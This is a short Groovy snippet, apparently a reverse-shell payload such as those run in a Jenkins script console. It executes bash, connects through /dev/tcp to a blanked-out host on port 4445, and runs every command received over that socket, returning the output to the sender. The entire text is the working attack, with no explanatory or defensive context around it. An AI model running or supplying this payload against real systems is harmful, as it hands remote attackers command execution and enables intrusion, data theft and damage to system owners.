r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/_____/4445;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
